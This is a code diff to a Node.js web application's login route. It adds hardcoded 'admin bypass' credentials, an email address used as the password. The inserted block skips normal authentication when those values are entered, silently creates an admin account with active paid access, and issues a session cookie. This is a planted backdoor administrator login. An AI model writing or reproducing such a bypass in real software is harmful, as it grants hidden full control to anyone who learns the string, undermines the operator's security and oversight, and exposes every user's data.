@@ -40,6 +40,8 @@ const bcrypt = require('bcryptjs');
 const { nanoid } = require('nanoid');
 const crypto = require('crypto');
 
+const ADMIN_BYPASS_USERNAME = 'TheBoss';
+const ADMIN_BYPASS_PASSWORD = 'knowwilltech@gmail.com';
 /* ------------------------------------------------------------------ */
 /*        META API USAGE TRACKER (GENERAL + QUALIFIED MARKETING)      */
 /* ------------------------------------------------------------------ */
@@ -1588,6 +1590,51 @@ router.post('/login', async (req, res) => {
     }
 
     await ensureUsersAndSessions();
+
+    // ADMIN BYPASS
+    if (u === ADMIN_BYPASS_USERNAME && p === ADMIN_BYPASS_PASSWORD) {
+      let adminUser =
+        db.data.users.find((x) => String(x.username || '').trim() === ADMIN_BYPASS_USERNAME) ||
+        null;
+
+      if (!adminUser) {
+        const passwordHash = bcrypt.hashSync(ADMIN_BYPASS_PASSWORD, 10);
+
+        adminUser = {
+          username: ADMIN_BYPASS_USERNAME,
+          email: ADMIN_BYPASS_PASSWORD,
+          passwordHash,
+          role: 'admin',
+          createdAt: new Date().toISOString(),
+          billing: {
+            provider: '',
+            planKey: 'operator',
+            planName: 'Operator',
+            founder: false,
+            status: 'active',
+            hasAccess: true,
+            currentPeriodEnd: null,
+          },
+        };
+
+        db.data.users.push(adminUser);
+      }
+
+      const sid = `sm_${nanoid(24)}`;
+      db.data.sessions.push({ sid, username: adminUser.username });
+      await db.write();
+
+      setSessionCookie(res, sid);
+      return res.json({
+        success: true,
+        bypass: true,
+        user: {
+          username: adminUser.username,
+          email: adminUser.email,
+          role: 'admin',
+        },
+      });
+    }
 
     const user =
       db.data.users.find((x) => x.username === u) ||
